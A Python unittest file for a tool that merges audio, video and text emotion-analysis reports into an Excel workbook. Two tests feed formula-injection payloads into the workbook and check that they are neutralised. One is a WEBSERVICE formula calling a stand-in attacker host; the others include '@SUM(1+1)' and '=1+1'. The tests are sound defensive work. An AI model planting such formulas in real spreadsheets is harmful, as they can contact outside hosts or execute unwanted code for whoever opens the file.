import csv
import dataclasses
import json
import tempfile
import unittest
from collections import Counter
from pathlib import Path
from unittest.mock import patch

import openpyxl

from analysis.native_face import NATIVE_FACE_METRICS
from analysis.video import (
    CanonicalVideoResult,
    DetectedVideoSource,
    VideoMetricProvenance,
    VideoOutputProvenance,
)
from analysis.video_contract import VIDEO_NORMALIZATION_VERSION
from analysis.video_contract import VIDEO_COMMON_METRICS
from analysis.combined_summary import (
    AUDIO_DIMENSIONS,
    AUDIO_EMOTIONS,
    AUDIO_METRICS,
    AUDIO_REQUIRED_METRICS,
    AUDIO_VALENCE,
    TEXT_DIMENSIONS,
    TEXT_SENTIMENT,
    VIDEO_DIMENSIONS,
    VIDEO_EMOTIONS,
    VIDEO_METRICS,
    VIDEO_SENTIMENT,
    VIDEO_VALENCE,
    COMPARISON_CONSTRUCTS,
    CombinedSource,
    InputError,
    SpeakerGroupDefinition,
    TextConstructSummary,
    build_combined_workbook,
    discover_combined_sources,
    protected_manual_discovery_directories,
    parse_sectioned_csv,
    _write_measure_guide,
)


def write_sectioned_report(
    path: Path,
    metrics: tuple[str, ...],
    base: float,
    source_orders: dict[str, list[str]] | None = None,
    sources: list[str] | None = None,
    counts: list[int] | None = None,
) -> None:
    """Write the descriptive-statistics CSV shape emitted by histograms."""

    path.parent.mkdir(parents=True, exist_ok=True)
    sources = sources or ["001_First", "002_Second", "003_Third", "004_Fourth", "005_Fifth"]
    counts = counts or [10] * len(sources)
    with path.open("w", encoding="utf-8", newline="") as handle:
        writer = csv.writer(handle)
        for metric_index, metric in enumerate(metrics):
            mean = base + metric_index
            writer.writerow([metric])
            writer.writerow(["classification", "core", "category", "emotion", "unit", "score"])
            writer.writerow(["metric", *(source_orders or {}).get(metric, sources)])
            writer.writerow(["count", *counts])
            writer.writerow(["missing", *([0] * len(sources))])
            writer.writerow(["mean", *[mean + offset for offset in range(len(sources))]])
            writer.writerow(["stddev", *([1] * len(sources))])
            writer.writerow(["kurtosis", *([0] * len(sources))])
            writer.writerow([])


class CombinedSummaryTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temp_dir = tempfile.TemporaryDirectory()
        self.root = Path(self.temp_dir.name)
        self.output_path = self.root / "combined-summary.xlsx"
        self.audio_emotion_root = self.root / "audio_output"
        self.video_emotion_root = self.root / "video_output"
        self._write_report(self.audio_emotion_root, "Andy Burnham", AUDIO_METRICS, 10)
        self._write_report(self.audio_emotion_root, "MARINE_LE_PEN", AUDIO_METRICS, 20)
        self._write_report(self.video_emotion_root, "Andy Burnham", VIDEO_METRICS, 30)
        self._write_report(self.video_emotion_root, "Marine Le Pen", VIDEO_METRICS, 40)

    def tearDown(self) -> None:
        self.temp_dir.cleanup()

    def test_sectioned_csv_import_is_bounded_before_full_parse(self) -> None:
        report = self.root / "oversized.csv"
        report.write_bytes(b"Metric\n" + b"x" * 64)
        with patch("analysis.combined_summary.MAX_IMPORTED_REPORT_BYTES", 16):
            with self.assertRaisesRegex(InputError, "exceeds.*16"):
                parse_sectioned_csv(report)

    def test_combined_discovery_bounds_candidate_count_before_sorting(self) -> None:
        with patch("analysis.combined_summary.MAX_COMBINED_REPORT_CANDIDATES", 1):
            with self.assertRaisesRegex(InputError, "candidate count.*1"):
                discover_combined_sources(self.audio_emotion_root, "audio")

    def test_combined_discovery_bounds_aggregate_candidate_bytes(self) -> None:
        with patch("analysis.combined_summary.MAX_COMBINED_REPORT_CANDIDATE_BYTES", 1):
            with self.assertRaisesRegex(InputError, "cumulative.*byte.*1"):
                discover_combined_sources(self.audio_emotion_root, "audio")

    def test_measure_guide_neutralizes_provider_controlled_formula_text(self) -> None:
        provenance = VideoOutputProvenance(
            requested_modality="video",
            resolved_provider="imotions_affdex",
            source_method="import",
            source_path=self.root,
            detection_evidence=("=WEBSERVICE(\"https://attacker.invalid\")",),
            detection_warnings=("@SUM(1+1)",),
            normalization_contract_version="+malicious",
            canonical_availability=(),
            original_columns=(
                VideoMetricProvenance("source-0001", "Anger", "=1+1", "-2+3"),
            ),
        )
        book = openpyxl.Workbook()
        book.remove(book.active)

        _write_measure_guide(book, (provenance,))

        guide = book["Measure Guide"]
        dynamic_values = {
            cell.value
            for row in guide.iter_rows(min_row=2)
            for cell in row
            if isinstance(cell.value, str)
        }
        for dangerous in (
            "=WEBSERVICE(\"https://attacker.invalid\")",
            "@SUM(1+1)",
            "+malicious",
            "=1+1",
            "-2+3",
        ):
            self.assertNotIn(dangerous, dynamic_values)
            self.assertIn("'" + dangerous, dynamic_values)

    def _write_report(
        self,
        root: Path,
        speaker: str,
        metrics: tuple[str, ...],
        base: float,
        source_orders: dict[str, list[str]] | None = None,
    ) -> Path:
        return_path = (
            root
            / "emotion"
            / speaker
            / "combined"
            / "other_findings"
            / "descriptive_statistics.csv"
        )
        write_sectioned_report(return_path, metrics, base, source_orders)
        return return_path

    def test_video_provider_matrix_writes_one_canonical_sheet_with_union_blanks(self) -> None:
        """Removing provider-specific branching must not restore a second sheet or zero-fill gaps."""

        established_imotions_metrics = tuple(
            metric for metric in VIDEO_METRICS if metric != "Arousal"
        )
        pyfeat_available = frozenset((*VIDEO_COMMON_METRICS, "Arousal"))
        cases = (
            ("imotions_affdex", "video", established_imotions_metrics, {"Arousal"}),
            (
                "pyfeat_native_face",
                "native_face",
                NATIVE_FACE_METRICS,
                set(VIDEO_METRICS) - pyfeat_available,
            ),
        )

        for provider, modality, report_metrics, unavailable_metrics in cases:
            for source_count in (1, 7, 14):
                with self.subTest(provider=provider, source_count=source_count):
                    source_ids = [
                        f"source-{index:04d}" for index in range(1, source_count + 1)
                    ]
                    report = (
                        self.root
                        / f"{provider}-{source_count}"
                        / "Researcher Alpha"
                        / "descriptive_statistics.csv"
                    )
                    write_sectioned_report(
                        report,
                        report_metrics,
                        10,
                        sources=source_ids,
                    )
                    result = build_combined_workbook(
                        {
                            modality: (
                                CombinedSource(
                                    modality,
                                    "researcher-alpha",
                                    "Researcher Alpha",
                                    report,
                                ),
                            )
                        },
                        self.root / f"{provider}-{source_count}.xlsx",
                        include_construct_comparison=True,
                    )

                    book = openpyxl.load_workbook(result.workbook_path, data_only=False)
                    self.assertEqual(result.quantitative_sheets, ("Video",))
                    self.assertIn("Video", book.sheetnames)
                    self.assertFalse(
                        any("native face" in name.casefold() for name in book.sheetnames)
                    )
                    self.assertEqual(
                        tuple(book["Video"].cell(row, 2).value for row in range(2, 2 + len(VIDEO_METRICS))),
                        VIDEO_METRICS,
                    )
                    self.assertEqual(
                        result.source_cells["Video|Anger"].speaker_observation_labels[0],
                        tuple(source_ids),
                    )
                    for metric in unavailable_metrics:
                        metric_cells = result.source_cells[f"Video|{metric}"]
                        self.assertIsNone(book["Video"][metric_cells.speaker_cells[0]].value)
                        self.assertIsNone(book["Video"][metric_cells.overall].value)
                    comparison = book["Construct Comparison"]
                    face_boxes = "\n".join(
                        str(comparison.cell(row, 2).value or "")
                        for row in range(7, 14)
                    )
                    extrema_boxes = "\n".join(
                        str(comparison.cell(row, column).value or "")
                        for row in range(7, 14)
                        for column in (6, 7)
                    )
                    for metric in unavailable_metrics:
                        metric_cells = result.source_cells[f"Video|{metric}"]
                        reference = f"'Video'!{metric_cells.speaker_cells[0]}"
                        self.assertNotIn(reference, face_boxes)
                        self.assertNotIn(f"Face: {metric} ", extrema_boxes)

    def test_video_provenance_flows_to_result_and_measure_guide_without_source_writes(self) -> None:
        """Omitting provider metadata from CombinedSource must not force Task 4 to inspect sheets."""

        self.assertIn(
            "video_provenance",
            {field.name for field in dataclasses.fields(CombinedSource)},
        )
        provider_root = self.root / "provider-source"
        provider_root.mkdir()
        source_manifest = provider_root / "source_manifest.json"
        source_metadata = provider_root / "source_metadata.csv"
        source_manifest.write_text('{"format_version": 1}\n', encoding="utf-8")
        source_metadata.write_text("SourceID,Country\nsource-0001,Ireland\n", encoding="utf-8")
        before = (source_manifest.read_bytes(), source_metadata.read_bytes())
        report = self.root / "provider-report" / "descriptive_statistics.csv"
        write_sectioned_report(
            report,
            tuple(metric for metric in VIDEO_METRICS if metric != "Arousal"),
            10,
            sources=["source-0001"],
        )
        detected = DetectedVideoSource(
            provider="imotions_affdex",
            source_path=provider_root.resolve(),
            source_method="import",
            evidence=("Accepted iMotions CSV: source-0001.csv (1 usable data row).",),
            warnings=("Imported legacy provider metadata was retained.",),
        )
        canonical = CanonicalVideoResult(
            provider="imotions_affdex",
            source_ids=("source-0001",),
            rows=({metric: None for metric in VIDEO_METRICS},),
            evidence=detected.evidence,
            warnings=detected.warnings,
            normalization_version=VIDEO_NORMALIZATION_VERSION,
            provenance=(
                VideoMetricProvenance(
                    "source-0001",
                    "Anger",
                    "Anger",
                    "FEA_Emotion_Anger",
                ),
            ),
        )
        provenance_builder = getattr(canonical, "output_provenance", None)
        self.assertIsNotNone(provenance_builder)
        provenance = provenance_builder(detected)
        source = CombinedSource(
            "video",
            "researcher-alpha",
            "Researcher Alpha",
            report,
            video_provenance=provenance,
        )

        result = build_combined_workbook(
            {"video": (source,)},
            self.root / "provider-aware.xlsx",
        )

        json.dumps(result.video_manifest_payload)
        self.assertEqual(result.video_manifest_payload["requested_modality"], "video")
        self.assertEqual(
            result.video_manifest_payload["sources"][0],
            provenance.to_manifest_payload(),
        )
        self.assertEqual(
            tuple(row["canonical_measure"] for row in result.video_column_manifest_rows),
            VIDEO_METRICS,
        )
        guide = openpyxl.load_workbook(result.workbook_path, data_only=False)["Measure Guide"]
        headers = tuple(cell.value for cell in guide[1])
        expected_metadata_headers = (
            "Requested modality",
            "Resolved provider",
            "Provider availability",
            "Detection evidence",
            "Detection warnings",
            "Normalization contract",
            "Original provider fields",
            "Channel identifiers",
        )
        for header in expected_metadata_headers:
            self.assertIn(header, headers)
        rows = {
            row[2].value: {headers[index]: cell.value for index, cell in enumerate(row)}
            for row in guide.iter_rows(min_row=2)
            if row[1].value == "Video"
        }
        self.assertEqual(tuple(rows), VIDEO_METRICS)
        self.assertEqual(rows["Anger"]["Requested modality"], "video")
        self.assertEqual(rows["Anger"]["Resolved provider"], "imotions_affdex")
        self.assertEqual(rows["Anger"]["Original provider fields"], "Anger")
        self.assertEqual(rows["Anger"]["Channel identifiers"], "FEA_Emotion_Anger")
        self.assertEqual(
            rows["Arousal"]["Provider availability"], "conditionally available"
        )
        self.assertEqual(
            (source_manifest.read_bytes(), source_metadata.read_bytes()),
            before,
        )

    def test_discovers_speaker_combined_reports_only(self) -> None:
        ignored = (
            self.audio_emotion_root
            / "emotion"
            / "Andy Burnham"
            / "001_First"
            / "other_findings"
            / "descriptive_statistics.csv"
        )
        write_sectioned_report(ignored, AUDIO_METRICS, 99)
        debug = (
            self.audio_emotion_root
            / "emotion"
            / "Debug Andy Burnham"
            / "combined"
            / "other_findings"
            / "descriptive_statistics.csv"
        )
        write_sectioned_report(debug, AUDIO_METRICS, 99)

        sources = discover_combined_sources(self.audio_emotion_root, "audio")

        self.assertEqual(
            [(item.speaker_key, item.modality) for item in sources],
            [("andyburnham", "audio"), ("marinelepen", "audio")],
        )

    def test_discovers_reports_from_a_generated_stage_root(self) -> None:
        stage_root = self.root / "generated_audio_stage"
        report = (
            stage_root
            / "emotion"
            / "analysis_run"
            / "Andy Burnham"
            / "combined"
            / "other_findings"
            / "descriptive_statistics.csv"
        )
        write_sectioned_report(report, AUDIO_METRICS, 10)

        sources = discover_combined_sources(stage_root, "audio")

        self.assertEqual(len(sources), 1)
        self.assertEqual(sources[0].display_name, "Andy Burnham")
        self.assertEqual(sources[0].report_path, report.resolve())

    def test_discovery_prefers_emotion_and_normalizes_case_insensitive_aliases(self) -> None:
        raw = self._write_report(self.audio_emotion_root, "andy_burnham", AUDIO_METRICS, 50)
        self._write_report(self.audio_emotion_root, "Andy Burnham", AUDIO_METRICS, 60)
        raw_destination = (
            self.audio_emotion_root
            / "raw"
            / "andy_burnham"
            / "combined"
            / "other_findings"
            / "descriptive_statistics.csv"
        )
        raw_destination.parent.mkdir(parents=True)
        raw.replace(raw_destination)

        sources = discover_combined_sources(self.audio_emotion_root, "audio")

        self.assertEqual(sources[0].speaker_key, "andyburnham")
        self.assertEqual(sources[0].display_name, "Andy Burnham")
        self.assertEqual(sources[0].report_path.name, "descriptive_statistics.csv")

    def test_duplicate_or_ambiguous_reports_are_rejected(self) -> None:
        canonical_report = (
            self.audio_emotion_root
            / "emotion"
            / "Andy Burnham"
            / "combined"
            / "other_findings"
            / "descriptive_statistics.csv"
        )
        canonical_report.unlink()
        self._write_report(self.audio_emotion_root, "Andy-Burnham", AUDIO_METRICS, 50)
        self._write_report(self.audio_emotion_root, "Andy Burnham", AUDIO_METRICS, 60)

        with self.assertRaisesRegex(InputError, "duplicate|ambiguous"):
            discover_combined_sources(self.audio_emotion_root, "audio")

    def test_rejects_output_destination_equal_to_a_source_report(self) -> None:
        sources = discover_combined_sources(self.video_emotion_root, "video")
        source_path = sources[0].report_path
        before = source_path.read_bytes()

        with self.assertRaisesRegex(InputError, "source report"):
            build_combined_workbook({"video": sources}, source_path)

        self.assertEqual(source_path.read_bytes(), before)

    def test_rejects_output_destination_inside_manual_discovery(self) -> None:
        manual_root = self.root / "Statistics_Manual_Discovery"
        manual_root.mkdir()
        checkout_anchor = self.root / "checkout" / "analysis" / "test_anchor.py"
        checkout_anchor.parent.mkdir(parents=True)
        discovered = protected_manual_discovery_directories(checkout_anchor)
        self.assertEqual(discovered, (manual_root.resolve(),))
        destination = manual_root / "task-3-protected-output-do-not-create" / "combined-summary.xlsx"

        with patch(
            "analysis.combined_summary.protected_manual_discovery_directories",
            return_value=discovered,
        ):
            with self.assertRaisesRegex(InputError, "Statistics_Manual_Discovery"):
                build_combined_workbook(
                    {"video": discover_combined_sources(self.video_emotion_root, "video")},
                    destination,
                )

        self.assertFalse(destination.parent.exists())

    def test_rejects_required_metric_with_reordered_source_labels(self) -> None:
        self._write_report(
            self.audio_emotion_root,
            "Andy Burnham",
            AUDIO_METRICS,
            10,
            {"Joy": ["002_Second", "001_First", "003_Third", "004_Fourth", "005_Fifth"]},
        )

        with self.assertRaisesRegex(InputError, "source order"):
            discover_combined_sources(self.audio_emotion_root, "audio")

    def test_partial_report_preserves_video_ordinals_and_uses_observed_counts(self) -> None:
        partial = (
            self.video_emotion_root
            / "emotion"
            / "Matteo Renzi"
            / "combined"
            / "other_findings"
            / "descriptive_statistics.csv"
        )
        write_sectioned_report(
            partial,
            VIDEO_METRICS,
            50,
            sources=["003_Third", "005_Fifth"],
            counts=[10, 20],
        )

        result = build_combined_workbook(
            {"video": discover_combined_sources(self.video_emotion_root, "video")},
            self.output_path,
            speaker_groups=(
                SpeakerGroupDefinition("italy", "Italy", ("Matteo Renzi",)),
            ),
        )

        sheet = openpyxl.load_workbook(result.workbook_path, data_only=False)["Video"]
        count_row = next(
            row for row in range(1, sheet.max_row + 1) if sheet.cell(row, 2).value == "COUNT"
        )
        detail_row = next(
            row for row in range(1, sheet.max_row + 1) if sheet.cell(row, 2).value == "Measures"
        )
        self.assertEqual(sheet.cell(count_row, 4).value, 30)
        self.assertEqual(sheet.cell(count_row + 1, 4).value, 15)
        self.assertAlmostEqual(sheet.cell(count_row + 2, 4).value, 7.0710678118654755)
        self.assertEqual(
            [sheet.cell(row, 4).value for row in range(count_row + 4, count_row + 9)],
            [None, None, 10, None, 20],
        )
        self.assertEqual(
            [sheet.cell(row, 4).value for row in range(detail_row + 1, detail_row + 6)],
            [None, None, "50.00 (+/- 1.00)", None, "51.00 (+/- 1.00)"],
        )
        self.assertTrue(any("2 of 5" in warning and "Matteo Renzi" in warning for warning in result.warnings))

    def test_default_layout_uses_only_supplied_speakers(self) -> None:
        result = build_combined_workbook(
            {"video": discover_combined_sources(self.video_emotion_root, "video")},
            self.output_path,
        )
        book = openpyxl.load_workbook(result.workbook_path, data_only=False)

        self.assertIsNone(book["Video"]["F2"].value)
        self.assertEqual(result.warnings, ())
        self.assertEqual(book["Video"]["S2"].value, "=AVERAGE(D2,E2)")

    def test_custom_group_uses_submitted_speaker_order_and_group_overall(self) -> None:
        self._write_report(self.video_emotion_root, "Nigel Farage", VIDEO_METRICS, 50)
        group = SpeakerGroupDefinition(
            group_id="focus",
            name="Focus group",
            speaker_ids=("Andy Burnham", "Nigel Farage", "Marine Le Pen"),
        )

        result = build_combined_workbook(
            {"video": discover_combined_sources(self.video_emotion_root, "video")},
            self.output_path,
            speaker_groups=(group,),
        )

        book = openpyxl.load_workbook(result.workbook_path, data_only=False)
        cells = result.source_cells["Video|Anger"]
        self.assertEqual(result.quantitative_sheets, ("Video",))
        self.assertEqual(
            [book["Video"][coordinate].value for coordinate in ("B1", "D1", "E1", "F1", "S1")],
            ["Focus group", "Andy Burnham", "Nigel Farage", "Marine Le Pen", "Overall"],
        )
        self.assertEqual(book["Video"]["S2"].value, "=AVERAGE(D2,E2,F2)")
        self.assertEqual(cells.speaker_ids, ("andyburnham", "nigelfarage", "marinelepen"))
        self.assertEqual(cells.speaker_cells, ("D2", "E2", "F2"))
        self.assertEqual(cells.overall, "S2")
        sheet = book["Video"]
        count_row = next(
            row for row in range(1, sheet.max_row + 1) if sheet.cell(row, 2).value == "COUNT"
        )
        detail_row = next(
            row for row in range(1, sheet.max_row + 1) if sheet.cell(row, 2).value == "Measures"
        )
        kurtosis_row = next(
            row for row in range(1, sheet.max_row + 1) if sheet.cell(row, 2).value == "Kurtosis"
        )
        self.assertEqual([sheet.cell(count_row, column).value for column in (4, 5, 6)], [50, 50, 50])
        self.assertTrue(all(sheet.cell(detail_row + 1, column).value for column in (4, 5, 6)))
        self.assertTrue(
            all(sheet.cell(kurtosis_row + 1, column).value == "0/0/0/0/0" for column in (4, 5, 6))
        )

    def test_multiple_groups_share_modality_sheets_and_keep_linked_blocks_together(self) -> None:
        groups = (
            SpeakerGroupDefinition("uk", "United Kingdom", ("Andy Burnham",)),
            SpeakerGroupDefinition("fr", "France", ("Marine Le Pen",)),
        )

        result = build_combined_workbook(
            {
                "audio": discover_combined_sources(self.audio_emotion_root, "audio"),
                "video": discover_combined_sources(self.video_emotion_root, "video"),
            },
            self.output_path,
            speaker_groups=groups,
        )

        book = openpyxl.load_workbook(result.workbook_path, data_only=False)
        self.assertEqual(
            result.quantitative_sheets,
            ("Audio", "Video"),
        )
        self.assertEqual(
            book.sheetnames,
            [
                "Audio",
                "Domain Def Text",
                "Video",
                "Domain Def Speech",
                "Measure Guide",
                "Text sentiment",
            ],
        )
        self.assertEqual(
            [book["Video"][coordinate].value for coordinate in ("B1", "D1", "G1", "H1", "S1")],
            ["United Kingdom", "Andy Burnham", "France", "Marine Le Pen", "Overall"],
        )
        self.assertEqual(book["Video"]["S2"].value, "=AVERAGE(D2,H2)")
        self.assertIn("Video|Anger", result.source_cells)
        self.assertGreaterEqual(book["Video"].column_dimensions["G"].width, 18)
        self.assertGreaterEqual(book["Video"].column_dimensions["H"].width, 18)
        self.assertGreaterEqual(book["Video"].column_dimensions["N"].width, 20)

    def test_full_metric_inventory_drives_dynamic_audio_rows_and_measure_guide(self) -> None:
        groups = (SpeakerGroupDefinition("focus", "Focus", ("Andy Burnham",)),)
        result = build_combined_workbook(
            {
                "audio": discover_combined_sources(self.audio_emotion_root, "audio"),
                "video": discover_combined_sources(self.video_emotion_root, "video"),
            },
            self.output_path,
            speaker_groups=groups,
        )

        book = openpyxl.load_workbook(result.workbook_path, data_only=False)
        audio = book["Audio"]
        headline_rows = {
            audio.cell(row, 2).value: row
            for row in range(2, 2 + len(AUDIO_METRICS))
        }
        self.assertEqual(tuple(headline_rows), AUDIO_METRICS)
        self.assertEqual(
            set(result.source_cells),
            {f"Audio|{metric}" for metric in AUDIO_METRICS}
            | {f"Video|{metric}" for metric in VIDEO_METRICS},
        )
        self.assertTrue(all(emotion in headline_rows for emotion in AUDIO_EMOTIONS))
        count_row = next(
            row for row in range(1, audio.max_row + 1) if audio.cell(row, 2).value == "COUNT"
        )
        detail_row = next(
            row for row in range(1, audio.max_row + 1) if audio.cell(row, 2).value == "Measures"
        )
        self.assertGreater(count_row, max(headline_rows.values()))
        self.assertGreater(detail_row, count_row + len(("Total", "Average", "Std Dev", *range(5))))
        self.assertEqual(
            tuple(
                audio.cell(detail_row + 1 + index * 5, 2).value
                for index in range(len(AUDIO_METRICS))
            ),
            AUDIO_METRICS,
        )

        guide = book["Measure Guide"]
        rows = {
            (row[1].value, row[2].value): tuple(cell.value for cell in row)
            for row in guide.iter_rows(min_row=2)
        }
        expected_ranges = {
            **{("Audio", metric): "0..100" for metric in (*AUDIO_EMOTIONS, *AUDIO_DIMENSIONS)},
            **{("Audio", metric): "-100..100" for metric in AUDIO_VALENCE},
            **{
                ("Video", metric): "0..100"
                for metric in (*VIDEO_EMOTIONS, *VIDEO_SENTIMENT, "Engagement", "Adaptive Engagement")
            },
            **{("Video", metric): "-100..100" for metric in (*VIDEO_VALENCE, "Arousal")},
            **{("Text", metric): "0..100" for metric in TEXT_SENTIMENT[:2]},
            ("Text", "Text Valence"): "-100..100",
            **{("Text", metric): "-100..100" for metric in TEXT_DIMENSIONS},
            ("Face / Audio / Text", "Min / Max"): "Ranked raw scores",
        }
        self.assertEqual({key: row[5] for key, row in rows.items()}, expected_ranges)
        self.assertTrue(
            any("not calibrated for direct cross-modality interpretation" in str(row[6]) for row in rows.values())
        )
        self.assertIn(
            "Min selects the lowest available measure inside each modality box",
            rows[("Face / Audio / Text", "Min / Max")][6],
        )

    def test_legacy_audio_report_hides_unavailable_optional_emotions(self) -> None:
        report = (
            self.audio_emotion_root
            / "emotion"
            / "Andy Burnham"
            / "combined"
            / "other_findings"
            / "descriptive_statistics.csv"
        )
        write_sectioned_report(report, AUDIO_REQUIRED_METRICS, 10)

        result = build_combined_workbook(
            {"audio": discover_combined_sources(self.audio_emotion_root, "audio")},
            self.output_path,
            speaker_groups=(SpeakerGroupDefinition("focus", "Focus", ("Andy Burnham",)),),
        )

        book = openpyxl.load_workbook(result.workbook_path, data_only=False)
        optional_metrics = {"Contempt", "Disgust", "Fear", "Surprise", "Other"}
        self.assertEqual(
            set(result.source_cells),
            {
                "Audio|Anger",
                "Audio|Joy",
                "Audio|Sadness",
                "Audio|Neutral",
                "Audio|Valence",
                "Audio|Arousal",
                "Audio|Dominance",
            },
        )
        audio_labels = {
            cell.value
            for cell in book["Audio"]["B"]
            if isinstance(cell.value, str)
        }
        self.assertTrue(optional_metrics.isdisjoint(audio_labels))
        guide_audio_labels = {
            row[2].value
            for row in book["Measure Guide"].iter_rows(min_row=2)
            if row[1].value == "Audio"
        }
        self.assertTrue(optional_metrics.isdisjoint(guide_audio_labels))
        legacy_warnings = [warning for warning in result.warnings if "legacy audio report" in warning.casefold()]
        self.assertEqual(len(legacy_warnings), 1)
        self.assertIn("omitted from speaker displays", legacy_warnings[0])

    def test_optional_audio_emotions_are_shown_only_for_speakers_with_values(self) -> None:
        report = (
            self.audio_emotion_root
            / "emotion"
            / "Andy Burnham"
            / "combined"
            / "other_findings"
            / "descriptive_statistics.csv"
        )
        write_sectioned_report(report, AUDIO_REQUIRED_METRICS, 10)
        result = build_combined_workbook(
            {
                "audio": discover_combined_sources(self.audio_emotion_root, "audio"),
                "video": discover_combined_sources(self.video_emotion_root, "video"),
            },
            self.output_path,
            speaker_groups=(
                SpeakerGroupDefinition("focus", "Focus", ("Andy Burnham", "Marine Le Pen")),
            ),
            include_construct_comparison=True,
        )

        book = openpyxl.load_workbook(result.workbook_path, data_only=False)
        comparison = book["Construct Comparison"]
        andy_audio = "\n".join(
            str(comparison.cell(row, 3).value or "") for row in range(7, 14)
        )
        marine_audio = "\n".join(
            str(comparison.cell(row, 11).value or "") for row in range(7, 14)
        )
        andy_extrema = "\n".join(
            str(comparison.cell(row, column).value or "")
            for row in range(7, 14)
            for column in (6, 7)
        )
        for metric in ("Contempt", "Disgust", "Fear", "Surprise", "Other"):
            cells = result.source_cells[f"Audio|{metric}"]
            andy_reference = f"'Audio'!{cells.speaker_cells[0]}"
            marine_reference = f"'Audio'!{cells.speaker_cells[1]}"
            self.assertNotIn(andy_reference, andy_audio)
            self.assertNotIn(f'"{metric}: "', andy_audio)
            self.assertNotIn(f"Audio: {metric} ", andy_extrema)
            self.assertIn(marine_reference, marine_audio)
            self.assertIn(f'"{metric}: "', marine_audio)
        self.assertIn("'Audio'!D6", andy_audio)

    def test_arbitrary_non_political_speaker_names_build_grouped_workbook(self) -> None:
        root = self.root / "arbitrary-audio"
        self._write_report(root, "Researcher Alpha", AUDIO_METRICS, 10)
        sources = discover_combined_sources(root, "audio")

        result = build_combined_workbook(
            {"audio": sources},
            self.output_path,
            speaker_groups=(SpeakerGroupDefinition("lab", "Lab cohort", ("researcheralpha",)),),
        )

        book = openpyxl.load_workbook(result.workbook_path, data_only=False)
        self.assertEqual(sources[0].display_name, "Researcher Alpha")
        self.assertEqual(book["Audio"]["D1"].value, "Researcher Alpha")
        self.assertEqual(result.source_cells["Audio|Anger"].speaker_ids, ("researcheralpha",))

    def test_arbitrary_non_political_speaker_is_not_omitted_without_explicit_groups(self) -> None:
        root = self.root / "arbitrary-default-audio"
        self._write_report(root, "Researcher Alpha", AUDIO_METRICS, 10)

        result = build_combined_workbook(
            {"audio": discover_combined_sources(root, "audio")},
            self.output_path,
        )

        book = openpyxl.load_workbook(result.workbook_path, data_only=False)
        self.assertEqual(book["Audio"]["B1"].value, "Speakers")
        self.assertEqual(book["Audio"]["D1"].value, "Researcher Alpha")
        self.assertEqual(result.source_cells["Audio|Anger"].speaker_ids, ("researcheralpha",))
        self.assertFalse(any("political" in warning.casefold() for warning in result.warnings))

    def test_combined_workbook_neutralizes_hostile_group_and_speaker_labels(self) -> None:
        root = self.root / "hostile-audio"
        self._write_report(root, "=1+1", AUDIO_METRICS, 10)

        result = build_combined_workbook(
            {"audio": discover_combined_sources(root, "audio")},
            self.output_path,
            speaker_groups=(SpeakerGroupDefinition("hostile", "@cohort", ("11",)),),
        )

        sheet = openpyxl.load_workbook(result.workbook_path, data_only=False)["Audio"]
        self.assertEqual(sheet["B1"].value, "'@cohort")
        self.assertEqual(sheet["D1"].value, "'=1+1")
        self.assertEqual(sheet["B1"].data_type, "s")
        self.assertEqual(sheet["D1"].data_type, "s")
        self.assertEqual(sheet["D2"].data_type, "n")

    def test_construct_comparison_is_formula_linked_and_can_be_disabled(self) -> None:
        groups = (
            SpeakerGroupDefinition("uk", "United Kingdom", ("Andy Burnham",)),
            SpeakerGroupDefinition("fr", "France", ("Marine Le Pen",)),
        )
        result = build_combined_workbook(
            {
                "audio": discover_combined_sources(self.audio_emotion_root, "audio"),
                "video": discover_combined_sources(self.video_emotion_root, "video"),
            },
            self.output_path,
            speaker_groups=groups,
            include_construct_comparison=True,
        )

        book = openpyxl.load_workbook(result.workbook_path, data_only=False)
        sheet = book["Construct Comparison"]
        self.assertEqual(sheet["A1"].value, "Multimodal construct comparison by speaker")
        self.assertEqual(sheet["A4"].value, "United Kingdom")
        self.assertEqual(sheet["A5"].value, "Andy Burnham")
        self.assertEqual(
            [sheet.cell(row, 1).value for row in range(7, 14)],
            [
                "Positive Sentiment",
                "Negative Sentiment",
                "Neutral / Other",
                "Arousal / Activation",
                "Valence",
                "Dominance / Power",
                "Affiliation / Social orientation",
            ],
        )
        self.assertIn("'Video'!D6", sheet["B7"].value)
        self.assertNotIn("'Video'!D12", sheet["B7"].value)
        self.assertNotIn("'Video'!D13", sheet["B7"].value)
        self.assertIn("'Audio'!D6", sheet["C7"].value)
        self.assertNotIn("'Audio'!D11", sheet["C7"].value)
        self.assertIsNone(sheet["D7"].value)
        self.assertIn("'Video'!D12", sheet["B11"].value)
        self.assertIn("'Video'!D13", sheet["B11"].value)
        self.assertIn("'Audio'!D11", sheet["C11"].value)
        self.assertEqual(sheet["F6"].value, "Min")
        self.assertEqual(sheet["G6"].value, "Max")
        self.assertIsNone(sheet["E6"].value)
        self.assertIsNone(sheet["H6"].value)
        self.assertEqual(sheet.column_dimensions["E"].width, 3)
        self.assertEqual(sheet.column_dimensions["H"].width, 3)
        self.assertEqual(sheet["I5"].value, None)
        self.assertEqual(sheet["Q5"].value, None)
        self.assertGreaterEqual(sheet.max_column, 24)

        without_comparison = self.root / "without-comparison.xlsx"
        build_combined_workbook(
            {"video": discover_combined_sources(self.video_emotion_root, "video")},
            without_comparison,
            speaker_groups=groups,
            include_construct_comparison=False,
        )
        without_book = openpyxl.load_workbook(without_comparison, read_only=True)
        try:
            self.assertNotIn("Construct Comparison", without_book.sheetnames)
        finally:
            without_book.close()

    def test_imported_text_constructs_populate_source_and_comparison_sheets(self) -> None:
        groups = (SpeakerGroupDefinition("uk", "United Kingdom", ("Andy Burnham",)),)
        text_summary = TextConstructSummary(
            speaker_id="andy_burnham",
            display_name="Andy Burnham",
            country="United Kingdom",
            constructs={
                "Positive Sentiment": 0.20,
                "Negative Sentiment": 0.10,
                "Arousal / Activation": 0.30,
                "Dominance / Power": 0.40,
                "Affiliation / Social orientation": 0.50,
            },
            source_path=self.root / "speaker_level_summary.csv",
        )

        result = build_combined_workbook(
            {
                "audio": discover_combined_sources(self.audio_emotion_root, "audio"),
                "video": discover_combined_sources(self.video_emotion_root, "video"),
            },
            self.output_path,
            speaker_groups=groups,
            text_summaries=(text_summary,),
            include_construct_comparison=True,
        )

        book = openpyxl.load_workbook(result.workbook_path, data_only=False)
        self.assertEqual(book["Text sentiment"]["D2"].value, 20.0)
        self.assertEqual(book["Text sentiment"]["D7"].value, 50.0)
        self.assertAlmostEqual(book["Text sentiment"]["D4"].value, 100 / 3)
        self.assertIn("100*(", book["Text sentiment"]["S4"].value)
        self.assertEqual(text_summary.constructs["Positive Sentiment"], 0.20)
        self.assertEqual(text_summary.constructs["Affiliation / Social orientation"], 0.50)
